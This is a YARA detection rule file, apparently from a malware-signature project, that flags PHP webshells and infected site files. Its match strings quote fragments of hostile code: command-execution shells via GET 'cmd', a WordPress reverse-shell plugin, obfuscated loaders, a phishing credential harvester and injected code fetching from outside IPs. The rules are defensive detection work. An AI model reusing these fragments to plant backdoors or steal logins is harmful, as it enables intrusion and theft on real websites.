      $s3 = "<?php error_reporting(0); $r=$_SERVER[\"HTTP_USER_AGENT\"];if((preg_match(\"/MSIE 9.0; Windows NT 6.0; Trident\\/5.0/i\",$r)) OR" ascii
      $s4 = "* See COPYRIGHT.php for copyright notices and details." fullword ascii
      $s5 = "* is derivative of works licensed under the GNU General Public License or" fullword ascii
      $s6 = "* to the GNU General Public License, and as distributed it includes or" fullword ascii
      $s7 = "Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved." fullword ascii
      $s8 = "echo JResponse::toString($mainframe->getCfg('gzip'));" fullword ascii
      $s9 = "require_once ( JPATH_BASE .DS.'includes'.DS.'framework.php' );" fullword ascii
      $s10 = "* other free or open source software licenses." fullword ascii
      $s11 = "t($_GET[\"z\"]))){echo \"<title>Hacked by d3b~X</title><center><div id=q>Gantengers Crew<br><font size=2>SultanHaikal - d3b~X - " ascii
      $s12 = "$option = JRequest::getCmd('option');" fullword ascii
      $s13 = "define( '_JEXEC', 1 );" fullword ascii
      $s14 = "require_once ( JPATH_BASE .DS.'includes'.DS.'defines.php' );" fullword ascii
      $s15 = "* RETURN THE RESPONSE" fullword ascii
      $s16 = "an Kamikaze - Coupdegrace - Mdn_newbie - Index Php <style>body{overflow:hidden;background-color:black}#q{font:40px impact;color:" ascii
      $s17 = "$mainframe->authorize($Itemid);" fullword ascii
      $s18 = "$Itemid = JRequest::getInt( 'Itemid');" fullword ascii
      $s19 = "$mainframe =& JFactory::getApplication('site');" fullword ascii
      $s20 = "$Id: index.php 14401 2010-01-26 14:10:00Z louis $" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 7KB and
         ( 8 of them )
      ) or ( all of them )
}

rule indo_exploit_tool
{

    meta:
       author = "Brian Laskowski"
       info = " indo exploit 05-14-18 "

    strings:
    
	$a1= "root@indoxploit:"
	$b1= "exec"
	$c1= "shell_exec"
	$d1= "#/var/named/(.*?).db#" 

    condition:
    all of them
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-19
   Identifier: shellcode
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule injection {
   meta:
      description = "shellcode - file injection.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-19"
      hash1 = "ea0616654ea7e38500fe3da07e38944dba174ec61bef3411fa6d4739c36a98de"
   strings:
      $s1 = "$ydrw = $sdyf('', $gstl($lodj(\"u\", \"\", $aguj.$syem.$rdby.$acrw))); $ydrw(); ?>" fullword ascii
      $s2 = "$acrw=\"RfZGVjubu2RlKCRufUuE9TVFsnudXBukYXRlJ10puKTt9\";" fullword ascii
      $s3 = "$sdyf = $lodj(\"p\",\"\",\"pcprepaptpe_pfupnpctpipopn\");" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2019-04-12
   Identifier: 04-12-19
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule xaishell {
   meta:
      description = "04-12-19 - file xaishell.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-04-12"
      hash1 = "7da18c114e0df44f78723657a54e4f38aa576a4331fc63ea63598aa5bc5c69ab"
   strings:
      $x1 = "$xaisyndicate = \"7b12W+O40gD6ueds5j+4PZwOvEBJaRpzSxL2kAQIWGpfHtt6O4TgxEFv4sz0/e23V4stO2kWmjnnPe8dcxoSLaVFqUcqVqWqX3+Z66ieqlg7kv" ascii
      $s2 = "/* (\" Default pass:\" xaishell \") */ " fullword ascii
      $s3 = "mFZ0OKddhVjysaYRmxqhcxtDUmPltxDP7f9gCX0fLiCmRrw0YnUrR+jTZ2Ge8renUpqazTJr6pcUtnDwnsy0c3TB6ZgxztBGdw+FtHH0kzvZHmBvrWpXWwyU7sR7LjKs" ascii
      $s4 = "otjgDbzSMD8Ps2WWJM/+/BTkaKJSEJYqi5ysfzOiJQddLLBgSW0U+WKO53IBl4tjScosG85DKxci6OE+AiIUVbEgYhFfwOT+BCv6MFnoXhDhZiUkqPEcnl4HQ4vxZlj2" ascii
      $s5 = "yVsrTbcPLBYkXsJ4c3erhhA6q+7UzAqP4tUxzxgAF14/uNkm3Ab0APUoEIRCnib6J5S6hKUdE8aaG66iYHqMdhjQ/mNZZW2a1x2nHStLkZxDrrEt72D+qPZar1SK+FeZ" ascii
      $s6 = "lNT4ufTp5lz5M9CUINjyu/VZ/a5xkGS5mjz6rx9nxZjN+YccPeF0jsOJ0aH3GIs7oVYnAkJ+X4dzzc3j+CBdTDZ4De36cZ4gF8j5fa4I5FjLc74hJwdSCnTjsElr1O24" ascii
      $s7 = "/NoMoRTL6Gce3tq7SY4IJxB1zJ6+fI8vAS2EXcTvW46jwirLY8gQAXLAnyvVVA6JLH5Hq/vSLimJWkNq+jOHzIirCqQBU9UY1iHsHaVMpL/yZIKlU5WesAhoIdnX1PyW" ascii
      $s8 = "AR0hiddYY/osZfx+Iq2cCQPiozbRXfUibDpilduT8lMR+QT8PPQrmwerBS6rTwaCWbVZxpkr5s2ftp0A0NTQ8jg6V/95iVyD8feN7wPp2CLChZ5UR7tsHgV/BGNvTMaA" ascii
      $s9 = "+52W2lPrfUCspYsaPF/uWpvzKtCXgkMbw8akd25D/uPgtDfmVdlDE701PO/6b47e040qm7VGb4C2Jw2uOYQzYQKq2r71EFSWeDY53dFTlb61Z2yR8Uz2I5ArTOWJwxz8" ascii
      $s10 = "uphdshqE5phe8zJHYCy61sLHtsLjq2/b8nE5rF8TknCHt7oBvtF5LX8l65EoW/LoG2fRq50b/yqXz3dQSlMwIBaWFZ1e6vlEWcxKXg03ZS11fmwiHlIL+AJSHOChGoIJ" ascii
      $s11 = "eSmGPisfPSoc50A3cy+vjweYe7E3d9s2tapH3Q7b2O8pQZ4z8OUa83jTPQr1T/QrkNuBQab1IVxtTr975EHEtpB+UOs+3L8njfTw8RKwz1AuuTeI4HeduegM6XmO+IXB" ascii
      $s12 = "liT0junH69ZfQiAUmCFQY4UGCqY7vc920LN25ww4wge1PTw9KQMN5t3Wc20v/qnaZ4PsjEN/Mgg2lOGhxMs7xDIlrU14AVOwbvqT66MuDOeMgUebWmoKlw3Db0htL5rO" ascii
      $s13 = "AWSl6cT90a3KG5nTDeWzOrkB2SgFTgmEMLR1ttJXdYVudTkJUvJbJPN76rdvtYbdIHabNSUF7lgzVZnqJpPpn/JwJAf7cZBTT0f2vXUgfV1DH7Kv2Dllf08+grZstzdn" ascii
      $s14 = "pfhBzSjxVJtdbgk733LD16HfUebvN76x14M75qqqkWamqlqQWgDMcryspsFIKTW7PM9lyG32VKYddvhcKBSCdc9m2q/S2skUOvkQf8MKjzUhstwq9J+9cyYNa/rAT/9m" ascii
      $s15 = "HSG6//1+/NxJnAL4/CmdXv9+D4kb79Fd4u5clGFvA59mDPT2l0dh9UZx+KugXr6KOE7eerp7SNT+GB35vDyeu6fXygO+9UX2IyyLYrxWza8YSyCofQl6G6iWlS2zB8qa" ascii
      $s16 = "4E/eU1H/V7PvKW0Xvv2lGybu9/WphKEwjf8um8u+n//+faZR5pP7ZSP6zq/x0ShnXyj+7ynZplQFox+wuTEH81leAkLzFcTkTISTvM7muMg2U5M0m2WZaxm/MfkbInQB" ascii
      $s17 = "INVYyMTkvoMjZpyeFErG3JD4j8VpeqTUknjJ//aUK6nPHR/UWNchRm8++Ofz1l7J6o9WyhNuWDPQfc0iaOL2CjBvyplsfzStMpnhnW0VMdqUIFk3Bf0ee8p94pvjT8rl" ascii
      $s18 = "gflxWzZRiEg3gzf6uYt/XiDxCYfgmv/3Aku+zdu/iYAng8IV/x7MMcFRzPhDldRFvtsgMFXKZGzDKdTcflPW9RIV6BInx8DfiVdw1HpXG0NHdjp/rKGllJvEKUuwLBcf" ascii
      $s19 = "OAvF0J5uZvgUj+t9IFa+1GyOj/hhochoeOjJpvkzi+CmD5B0VrSi6A6GK3yQWBTTkWjLUefCY1dA7wkVXqo9bPAkflqCQ/WSKJfP95eF/b2nQqfET0wKmF50ZidPr/97" ascii
      $s20 = "JNqndu+Vv9YBNeMwEAxiwqeqABfswRuUeFW9cEr9WqGgMvdsA1qiUikpFDbem7qwDT+7j21Gm+bINtscZkkEgIVhSoI3lMryHe2d5lyr9wPPwXarBagmV19nmDYJ3dyK" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 100KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule infected_04_12_19_Logon {
   meta:
      description = "04-12-19 - file Logon.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-04-12"
      hash1 = "6f1757cb95bf4261459cf829a0cb32688a9c328951bd054611f28ca10916e93e"
   strings:
      $s1 = "$ip_data = @json_decode(file_get_contents(\"http://www.geoplugin.net/json.gp?ip=\".$ip));" fullword ascii
      //$s2 = "$message .= \"--- http://www.geoiptool.com/?IP=$ip ----\\n\";" fullword ascii
      //$s3 = "Login2.php?$url&username=$username" fullword ascii
      //$s4 = "$message .= \"---------+ Office365 Login  |+-------\\n\";" fullword ascii
      //$s5 = "$headers = \"From: Salamusasa <tee@ttcpanel.com>\\n\";" fullword ascii
      //$s6 = "$send = \"stegmollersarah@gmail.com, halifax89@yandex.com\";" fullword ascii
      //$s7 = "$password = $_POST['password'];" fullword ascii
      //$s8 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii
      //$s9 = "header(\"Location: index.php?$url&username=$username\");" fullword ascii
      $s10 = "$hostname = gethostbyaddr($ip);" fullword ascii
      //$s11 = "$message .= \"Password : \".$password.\"\\n\";" fullword ascii
      //$s12 = "$message .= \"User Agent : \".$browser.\"\\n\";" fullword ascii
      //$s13 = "$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];" fullword ascii
      //$s14 = "$headers .= \"MIME-Version: 1.0\\n\";" fullword ascii
      $s15 = "$passchk = strlen($password);" fullword ascii
      //$s16 = "<title>403 - Forbidden</title>" fullword ascii
      //$s17 = "$username = $_POST['username'];" fullword ascii
      $s18 = "$ip = getenv(" fullword ascii
      //$s19 = "--+ Created BY Overlappin in 2018 +-" ascii
      $s20 = "elseif(filter_var($forward" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 7KB and
         ( 8 of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-10-02
   Identifier: 10-02-18
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_10_02_18_xmlrpc {
   meta:
      description = "10-02-18 - file xmlrpc.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-10-02"
      hash1 = "cff439c34b4cf5428157d104d356c88633c8d92e6c8d1d6dd7bd46eca21ddc63"
   strings:
      $s1 = "$file = file_get_contents('http://132.232.67.18:8000/'.\"/index.php?host=\".$host_name.\"&url=\" . $_SERVER['QUERY_STRING'] . \"" ascii
      $s2 = "$file = file_get_contents('http://119.27.172.144:8000/'.\"/index.php?host=\".$host_name.\"&url=\" . $_SERVER['QUERY_STRING'] . " ascii
      $s3 = "$key= $_SERVER[\"HTTP_USER_AGENT\"].$_SERVER[\"HTTP_REFERER\"];" fullword ascii
      $s4 = "$file = file_get_contents('http://119.27.172.144:8000/'.\"/index.php?host=\".$host_name.\"&url=\" . $_SERVER['QUERY_STRING'] . " ascii
      $s5 = "$file = file_get_contents('http://132.232.67.18:8000/'.\"/index.php?host=\".$host_name.\"&url=\" . $_SERVER['QUERY_STRING'] . \"" ascii
      $s6 = "$key= $_SERVER[\"HTTP_USER_AGENT\"];" fullword ascii
      $s7 = "os($key,'Easou')!==false||strpos($key,'360')!==false||strpos($key,'haosou')!==false||strpos($key,'Soso')!==false)" fullword ascii
      $s8 = "header('Content-Type:text/html;charset=gb2312');" fullword ascii
      $s9 = "$host_name = \"http://\".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'];" fullword ascii
      $s10 = "$file = file_get_contents(base64_decode(\"aHR0cDovL2pzY2IuanNjMTgueHl6OjgwMDAv\").base64_decode(\"L2luZGV4LnBocD9ob3N0PQ==\").$h" ascii
      $s11 = "$file = file_get_contents(base64_decode(\"aHR0cDovL2pzY2IuanNjMTgueHl6OjgwMDAv\").base64_decode(\"L2luZGV4LnBocD9ob3N0PQ==\").$h" ascii
      $s12 = "st_name.\"&url=\" . $_SERVER['QUERY_STRING'] . \"&domain=\" . $_SERVER['SERVER_NAME']); " fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 40KB and
         ( 8 of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-07-28
   Identifier: yertle
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule yertle_yertle {
   meta:
      description = "yertle - file yertle.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-28"
      hash1 = "2031cea1ee6be78abc632b7be0b4ef3c180da44d601348543db408b68b0ec4d6"
   strings:
      $s1 = "// Copied and modified from https://github.com/leonjza/wordpress-shell" fullword ascii
      $s2 = "Author URI: https://github.com/n00py" fullword ascii
      $s3 = "Description: This is a backdoor PHP shell designed to be used with the Yertle script from WPForce." fullword ascii
      $s4 = "Plugin URI: https://github.com/n00py" fullword ascii
      $s5 = "$command = substr($command, 0, -1);" fullword ascii
      $s6 = "Plugin Name: Yertle Interactive Shell" fullword ascii
      $s7 = "call_user_func_array('system', array($command));" fullword ascii
      $s8 = "$command = base64_decode($command);" fullword ascii
      $s9 = "call_user_func('system', $command);" fullword ascii
      $s10 = "$command = $_GET[\"cmd\"];" fullword ascii
      $s11 = "system($command);" fullword ascii
      $s12 = "$thingy = $function->invoke($command );" fullword ascii
      $s13 = "$function = new ReflectionFunction('system');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 2KB and
         ( 8 of them )
      ) or ( all of them )
}

rule yertle_r {
   meta:
      description = "yertle - file yertle-r.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-28"
      hash1 = "527d3b0ede0780c48098c4bd43c266ca91c6bd417c7144ef898fa1326292130b"
   strings:
      $s1 = "$shell = 'uname -a; w; id; python -c \\'import pty;pty.spawn(\"/bin/bash\")\\'';" fullword ascii
      $s2 = "// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck." fullword ascii
      $s3 = "Description: This spawns a backdoor PHP reverse shell designed to be used with the Yertle script from WPForce." fullword ascii
      $s4 = "// This script will make an outbound TCP connection to a hardcoded IP and port." fullword ascii
      $s5 = "printit(\"ERROR: Shell process terminated\");" fullword ascii
      $s6 = "// php-reverse-shell - A Reverse Shell implementation in PHP" fullword ascii
      $s7 = "$process = proc_open($shell, $descriptorspec, $pipes);" fullword ascii
      $s8 = "printit(\"Successfully opened reverse shell to $ip:$port\");" fullword ascii
      $s9 = "// Spawn shell process" fullword ascii
      $s10 = "// The recipient will be given a shell running as the current user (apache normally)." fullword ascii
      $s11 = "Author URI: https://github.com/n00py" fullword ascii
      $s12 = "printit(\"ERROR: Shell connection terminated\");" fullword ascii
      $s13 = "// Make the current process a session leader" fullword ascii
      $s14 = "// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows." fullword ascii
      $s15 = "0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from" fullword ascii
      $s16 = "// This tool may be used for legal purposes only.  Users take full responsibility" fullword ascii
      $s17 = "Plugin URI: https://github.com/n00py" fullword ascii
      $s18 = "Plugin Name: Yertle Reverse Shell" fullword ascii
      $s19 = "// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available." fullword ascii
      $s20 = "printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 20KB and
         ( 8 of them )
      ) or ( all of them )
}

rule leonjzashell {
   meta:
      description = "yertle - file leonjzashell.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-28"
      hash1 = "5f01b6d93673c9d1673aea513c51688b54e1c8c5c31e9770f6530c4dfdbc87dd"
   strings:
      $x1 = "Description: Execute Commands as the webserver you are serving wordpress with! Shell will probably live at /wp-content/plugi" fullword ascii
      $x2 = "Description: Execute Commands as the webserver you are serving wordpress with! Shell will probably live at /wp-content/plugins/s" ascii
      $s3 = "ns/shell/shell.php. Commands can be given using the 'cmd' GET parameter. Eg: \"http://192.168.0.1/wp-content/plugins/shell/shell" ascii
      $s4 = "Plugin URI: https://github.com/leonjza/wordpress-shell" fullword ascii
      $s5 = "# grab the command we want to run from the 'cmd' GET parameter" fullword ascii
      $s6 = "# Try to find a way to run our command using various PHP internals" fullword ascii
      $s7 = "# http://php.net/manual/en/function.system.php" fullword ascii
      $s8 = "php?cmd=id\", should provide you with output such as <code>uid=33(www-data) gid=verd33(www-data) groups=33(www-data)</code>" fullword ascii
      $s9 = "# http://php.net/manual/en/function.call-user-func-array.php" fullword ascii
      $s10 = "call_user_func_array('system', array($command));" fullword ascii
      $s11 = "# attempt to protect myself from deletion" fullword ascii
      $s12 = "# http://php.net/manual/en/function.call-user-func.php" fullword ascii
      $s13 = "call_user_func('system', $command);" fullword ascii
      $s14 = "$command = $_GET[\"cmd\"];" fullword ascii
      $s15 = "Plugin Name: Cheap & Nasty Wordpress Shell" fullword ascii
      $s16 = "system($command);" fullword ascii
      $s17 = "# http://php.net/manual/en/class.reflectionfunction.php" fullword ascii
      $s18 = "# has system() on a blacklist anyways :>" fullword ascii
      $s19 = "$function->invoke($command);" fullword ascii
      $s20 = "Author URI: https://leonjza.github.io" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 4KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-06-06
   Identifier: case122
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule _infected_case122_y_php_shell {
   meta:
      description = "case122 - file y.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-06"
      hash1 = "72ae0da8540453009cb64a6b151f2e452e76923d2bbb49e632c383c183aed3ad"
   strings:
      //$x1 = "<link rel=\"shortcut icon\" href=\"https://avatars2.githubusercontent.com/u/39534193?s=160&v=4\">" fullword ascii
      //$s2 = "unescape('%27%29%29%3b'));" fullword ascii
      $s3 = "20%3f%3a%2d%25%30%33%3c%33%36%30%3e%2a%2c%2a%76%68%63%67%29%3d%33%2d%26%32%35%2c%2a%30%2d%25%30%33%3b%33%37%3d%2a%2a%3d%2a%70%70" ascii /* hex encoded string ' ?:-%03<360>*,*vhcg)=3-&25,*0-%03;37=**=*pp' */
      //$s4 = "Don't Steal This Script Fucker" fullword ascii
      $s5 = "67%68%59%64%72%6d%2d%23%64%65%7a%27%2a%5d%79%68%31%70%6c%6f%70%6b%7e%54%70%75%20%43%2b%67%70%63%7e%76%6b%78%74%33%63%71%65%74%31" ascii /* hex encoded string 'ghYdrm-#dez'*]yh1plopk~Tpu C+gpc~vkxt3cqet1' */
      $s6 = "21%20%7c%25%74%70%7b%3d%21%63%62%69%65%22%37%31%35%2b%21%38%23%37%76%7d%2a%3d%2a%74%77%62%72%74%61%72%77%75%3b%25%76%7b%74%66%71" ascii /* hex encoded string '! |%tp{=!cbie"715+!8#7v}*=*twbrtarwu;%v{tfq' */
      $s7 = "6b%60%43%28%34%31%6b%7a%71%75%73%37%6c%71%7b%69%6d%6e%67%71%64%76%33%63%74%76%31%6f%75%74%44%6a%66%78%6c%6d%79%46%50%68%6d%76%6a" ascii /* hex encoded string 'k`C(41kzqus7lq{imngqdv3ctv1outDjfxlmyFPhmvj' */
      $s8 = "6a%70%79%77%32%73%6a%7b%6b%34%3b%31%75%78%3c%6e%72%6d%77%73%3b%79%62%6f%75%6e%3d%66%67%6c%68%74%36%6a%74%61%73%74%3b%65%6a%79%77" ascii /* hex encoded string 'jpyw2sj{k4;1ux<nrmws;yboun=fglht6jtast;ejyw' */
      $s9 = "6a%6e%37%67%78%6f%72%62%74%6e%7a%71%21%45%25%23%75%78%71%78%25%3b%3a%3b%76%21%6a%6a%77%6b%6d%76%21%6f%71%77%72%64%77%62%70%23%3d" ascii /* hex encoded string 'jn7gxorbtnzq!E%#uxqx%;:;v!jjwkmv!oqwrdwbp#=' */
      $s10 = "6e%78%68%73%26%63%74%71%67%32%21%4a%74%21%63%64%74%26%70%7e%76%70%6f%7b%6e%64%21%79%72%75%26%74%77%6c%75%20%6b%6a%7a%6a%2b%66%6a" ascii /* hex encoded string 'nxhs&ctqg2!Jt!cdt&p~vpo{nd!yru&twlu kjzj+fj' */
      $s11 = "77%77%79%25%70%74%6d%72%65%62%76%65%2b%67%7a%75%76%7a%20%7e%6b%79%71%20%6a%71%68%77%26%70%6a%72%6f%6b%21%71%68%6a%2b%34%3a%36%35" ascii /* hex encoded string 'wwy%ptmrebve+gzuvz ~kyq jqhw&pjrok!qhj+4:65' */
   condition:
      ( uint16(0) == 0x683c and
         filesize < 30KB and
           all of them )
}

